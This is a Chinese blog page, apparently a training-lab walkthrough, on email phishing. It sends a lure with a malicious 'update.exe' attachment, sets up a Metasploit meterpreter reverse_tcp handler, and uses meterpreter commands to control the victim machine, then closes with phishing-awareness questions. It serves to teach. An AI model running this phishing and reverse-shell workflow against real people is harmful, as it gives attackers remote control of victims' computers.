@@ -1,0 +1,283 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>mail钓鱼 - 李希然的博客</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="实验环境
+操作机：kali
+
+目标机： Windows 7+centos 7
+
+目标地址：172.16.11.2+172.16.12.12
+
+
+实验工具FireFox：
+火狐浏览器，用来访问互联网的,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="李希然的博客" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">李希然的博客</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">mail钓鱼</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">mail钓鱼</h1>
+        <div class="stuff">
+            <span>十月 31, 2021</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h4 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h4><ul>
+<li><p>操作机：<code>kali</code></p>
+</li>
+<li><p>目标机： <code>Windows 7</code>+<code>centos 7</code></p>
+</li>
+<li><p>目标地址：<code>172.16.11.2</code>+<code>172.16.12.12</code></p>
+</li>
+</ul>
+<h4 id="实验工具"><a href="#实验工具" class="headerlink" title="实验工具"></a>实验工具</h4><p><strong>FireFox：</strong></p>
+<p>火狐浏览器，用来访问互联网的免费工具</p>
+<p><strong>metasploit-framework：</strong></p>
+<p>用来进行远控的工具</p>
+<h4 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h4><p><strong>实验原理</strong></p>
+<ul>
+<li>角色扮演</li>
+<li>攻击者<code>hack</code>对<code>giaogiao</code>公司进行了邮件钓鱼，作为公司it部的一名员工，打开了攻击者发送的邮件，并且下载了攻击者发送的恶意程序，导致自己的计算机被控制。</li>
+<li>攻击者角色</li>
+<li>hack使用kali Linux向目标giaogiao公司的it员工，发送钓鱼邮件，并且使用metasploit进行远控监听，</li>
+<li>被攻击者角色</li>
+<li>作为giaogiao公司的it员工，收到hack发送的邮件，没有进行审核就直接打开打开邮件附件，导致自己的电脑被控制。</li>
+</ul>
+<h4 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h4><ul>
+<li>需要操作者扮演不同的角色，来体验被钓鱼攻击的效果</li>
+</ul>
+<h4 id="步骤1-扮演攻击者，向目标发送钓鱼邮件"><a href="#步骤1-扮演攻击者，向目标发送钓鱼邮件" class="headerlink" title="步骤1 扮演攻击者，向目标发送钓鱼邮件"></a>步骤1 扮演攻击者，向目标发送钓鱼邮件</h4><ol>
+<li>访问进入系统后，先关闭开启的终端窗口。</li>
+<li>打开系统自带的浏览器，并访问网址<code>172.16.12.12</code></li>
+</ol>
+<p><img src="https://i.loli.net/2021/10/31/OTLYBFZnzXQtmiS.png"></p>
+<ol start="3">
+<li>使用账户<code>hack@yaoshui.com</code>，密码<code>hack@123456</code>进行登陆</li>
+<li>登陆系统后在草稿箱中查看准备好的钓鱼邮件，将钓鱼邮件发送给<code>giaogiao</code>公司的<code>it</code>员工。</li>
+</ol>
+<p><img src="https://i.loli.net/2021/10/31/qAcEyQF9ClNIbhJ.png"></p>
+<p>邮件中已经编写了钓鱼信息，诱导员工安装软件，并且进行一些言语上的引导。</p>
+<p><img src="https://i.loli.net/2021/10/31/x1BUaiQvMdHGfnP.png"></p>
+<p>在邮件的附件中，会加入远控的程序</p>
+<ol start="3">
+<li>点击发送就会将钓鱼邮件发送给被攻击者</li>
+</ol>
+<p><img src="https://i.loli.net/2021/10/31/jKLMCvtSZgdriVl.png"></p>
+<h4 id="步骤2-扮演攻击者，启动远控程序，等待目标上线"><a href="#步骤2-扮演攻击者，启动远控程序，等待目标上线" class="headerlink" title="步骤2 扮演攻击者，启动远控程序，等待目标上线"></a>步骤2 扮演攻击者，启动远控程序，等待目标上线</h4><ol>
+<li>启动<code>Terminal</code>软件，在命令行输入<code>msfconsole</code>命令，并按回车。</li>
+</ol>
+<p><img src="mail%E9%92%93%E9%B1%BC.assets/image-20210605162744420.png" alt="image-20210605162744420"></p>
+<p>等待一段时间后即可进入<code>metasploit</code></p>
+<p><img src="https://i.loli.net/2021/10/31/FOG8lDCtHRLSMQX.png"></p>
+<ol start="2">
+<li>在msf的控制窗口中执行开启远控，等待目标上线，需要执行以下命令</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 0.0.0.0</span><br><span class="line">lhost =&gt; 0.0.0.0</span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 0.0.0.0:4444</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/10/31/ZDR8Eecrg2T3AXY.png"></p>
+<h4 id="步骤3-扮演受害者，查看邮件并且点击了钓鱼程序"><a href="#步骤3-扮演受害者，查看邮件并且点击了钓鱼程序" class="headerlink" title="步骤3 扮演受害者，查看邮件并且点击了钓鱼程序"></a>步骤3 扮演受害者，查看邮件并且点击了钓鱼程序</h4><ol>
+<li>在终端中开启新的标签页</li>
+</ol>
+<p><img src="https://i.loli.net/2021/10/31/uUd1Ir7GmB8kaOs.png"></p>
+<ol start="2">
+<li>在新建的标签页中使用命令<code>redesktop -u me -p me 172.16.12.2</code>远程连接到giaogiao公司的it计算机，并且在输入提示中输入<code>yes</code></li>
+</ol>
+<p><img src="mail%E9%92%93%E9%B1%BC/image-20210605165910141.png"></p>
+<ol start="3">
+<li>回车后就可连接到受害计算机，并且在新显示出来的计算机窗口中，点击最大化</li>
+</ol>
+<p><img src="mail%E9%92%93%E9%B1%BC/image-20210605170103063.png"></p>
+<ol start="4">
+<li>点击桌面上的<code>foxmail</code>软件，可以进入到giaogiao公司的it员工的邮箱。it员工在收到邮件后，根据邮件的提示，下载了邮件的附件程序，并且双击进行运行。</li>
+</ol>
+<p><img src="mail%E9%92%93%E9%B1%BC/image-20210605170353852.png"></p>
+<p>保存文件到桌面</p>
+<p><img src="mail%E9%92%93%E9%B1%BC/image-20210605170653812.png"></p>
+<ol start="5">
+<li>在桌面上，解压<code>update.zip</code>并运行解压后的<code>update.exe</code></li>
+</ol>
+<p><img src="mail%E9%92%93%E9%B1%BC/image-20210605171402049.png"></p>
+<p><img src="mail%E9%92%93%E9%B1%BC/image-20210605171435312.png"></p>
+<p><img src="mail%E9%92%93%E9%B1%BC/image-20210605171508885.png"></p>
+<h4 id="步骤4-扮演攻击者，在终端中可以控制目标计算机"><a href="#步骤4-扮演攻击者，在终端中可以控制目标计算机" class="headerlink" title="步骤4 扮演攻击者，在终端中可以控制目标计算机"></a>步骤4 扮演攻击者，在终端中可以控制目标计算机</h4><ol>
+<li>切换回kali中的终端<code>msfconsole</code>，此时就可以看到目标及其成功上线，可以在终端中查看目标系统信息。</li>
+</ol>
+<p><img src="mail%E9%92%93%E9%B1%BC/image-20210605171703068.png"></p>
+<ol start="2">
+<li>在<code>meterpreter </code>中执行命令，可以控制目标计算机</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">...</span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">...</span><br><span class="line">meterpreter &gt; screenshare</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p><img src="mail%E9%92%93%E9%B1%BC/image-20210605171914603.png"></p>
+<p><img src="mail%E9%92%93%E9%B1%BC/image-20210605172056455.png"></p>
+<blockquote>
+<p> 执行命令<code>sysinfo</code>用来查看目标操作系统信息</p>
+</blockquote>
+<blockquote>
+<p> 执行命令<code>ls</code>用来查看目标目录下的文件</p>
+</blockquote>
+<blockquote>
+<p> 执行命令<code>screenshare</code>用来查看目标的电脑屏幕，同时会自动打开浏览器，在浏览器中查看</p>
+</blockquote>
+<h4 id="实验结果分析与总结"><a href="#实验结果分析与总结" class="headerlink" title="实验结果分析与总结"></a>实验结果分析与总结</h4><p>在本次实验中，由于it员工的失误，在收到由黑客发送的钓鱼邮件后，下载并运行了邮件的附件，最终导致自己的计算机被控制。</p>
+<h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><ul>
+<li>当我们在接收到一些需要下载安装程序的邮件时，应该如何正确的处理？<ul>
+<li>答案：找到公司的安全的人员，在通过他们的检测后再下载安装</li>
+</ul>
+</li>
+<li>我们应该如何分别邮件是真正的公司员工发送的，还是攻击者发送的？<ul>
+<li>答案：根据发送邮件的地址，要认证对比每一个字母</li>
+</ul>
+</li>
+</ul>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-number">1.</span> <span class="toc-text">实验环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%B7%A5%E5%85%B7"><span class="toc-number">2.</span> <span class="toc-text">实验工具</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%86%85%E5%AE%B9"><span class="toc-number">3.</span> <span class="toc-text">实验内容</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4"><span class="toc-number">4.</span> <span class="toc-text">实验步骤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A41-%E6%89%AE%E6%BC%94%E6%94%BB%E5%87%BB%E8%80%85%EF%BC%8C%E5%90%91%E7%9B%AE%E6%A0%87%E5%8F%91%E9%80%81%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6"><span class="toc-number">5.</span> <span class="toc-text">步骤1 扮演攻击者，向目标发送钓鱼邮件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A42-%E6%89%AE%E6%BC%94%E6%94%BB%E5%87%BB%E8%80%85%EF%BC%8C%E5%90%AF%E5%8A%A8%E8%BF%9C%E6%8E%A7%E7%A8%8B%E5%BA%8F%EF%BC%8C%E7%AD%89%E5%BE%85%E7%9B%AE%E6%A0%87%E4%B8%8A%E7%BA%BF"><span class="toc-number">6.</span> <span class="toc-text">步骤2 扮演攻击者，启动远控程序，等待目标上线</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A43-%E6%89%AE%E6%BC%94%E5%8F%97%E5%AE%B3%E8%80%85%EF%BC%8C%E6%9F%A5%E7%9C%8B%E9%82%AE%E4%BB%B6%E5%B9%B6%E4%B8%94%E7%82%B9%E5%87%BB%E4%BA%86%E9%92%93%E9%B1%BC%E7%A8%8B%E5%BA%8F"><span class="toc-number">7.</span> <span class="toc-text">步骤3 扮演受害者，查看邮件并且点击了钓鱼程序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A44-%E6%89%AE%E6%BC%94%E6%94%BB%E5%87%BB%E8%80%85%EF%BC%8C%E5%9C%A8%E7%BB%88%E7%AB%AF%E4%B8%AD%E5%8F%AF%E4%BB%A5%E6%8E%A7%E5%88%B6%E7%9B%AE%E6%A0%87%E8%AE%A1%E7%AE%97%E6%9C%BA"><span class="toc-number">8.</span> <span class="toc-text">步骤4 扮演攻击者，在终端中可以控制目标计算机</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%BB%93%E6%9E%9C%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%BB%E7%BB%93"><span class="toc-number">9.</span> <span class="toc-text">实验结果分析与总结</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%80%83"><span class="toc-number">10.</span> <span class="toc-text">思考</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
